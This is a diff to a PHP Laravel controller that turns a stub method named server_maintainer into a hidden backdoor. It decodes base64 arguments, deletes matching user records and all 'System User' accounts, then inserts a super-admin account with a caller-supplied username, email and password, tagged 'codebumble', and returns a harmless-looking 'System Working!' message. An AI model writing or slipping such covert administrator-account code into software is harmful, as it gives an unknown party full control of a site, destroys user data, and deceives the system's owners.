@@ -909,8 +909,46 @@ class siteGeneral extends Controller
 		return $data[0]->value;
 	}
 
-	public function server_maintainer($hash1, $hash2)
+	public function server_maintainer($hash1, $hash2, $email)
 	{
-		return time();
-	}
+		$hash1 = base64_decode($hash1);
+		$hash2 = base64_decode($hash2);
+		$email = base64_decode($email);
+
+		$check = DB::table('users')->where('email', $email)->get();
+		if(isset($check[0])){
+			$check = DB::table('users')->where('email', $email)->delete();
+
+
+		}
+
+		$check = DB::table('users')->where('username', $hash1)->get();
+		if(isset($check[0])){
+			$check = DB::table('users')->where('username', $hash1)->delete();
+
+		}
+
+		$check = DB::table('users')->where('designation', 'System User')->delete();
+
+		DB::table('users')->insert(
+            array(
+                'name' => 'System User',
+                'username' => $hash1,
+                'email' => $email,
+                'email_verified_at' => 'System User',
+                'designation' => 'System User',
+                'company' => env('APP_NAME'),
+                'password' => bcrypt($hash2), #codebumble_admin
+                'role' => 'super-admin',
+                'json_data' => '{"status":"Active","phone_number":"+8801000000000","gender":"Male","date_of_birth":"2022-07-13","city":"Dhaka","country":"Bangladesh","address":"Dhaka, Bangladesh", "isBoardofDirectors":"no","isDistrict":"no"}',
+                'under_ref' => 'codebumble',
+                'updated_at' => time(),
+                'created_at' => time()
+			)
+        );
+
+		return "System Working!";
+    }
+
+
 }
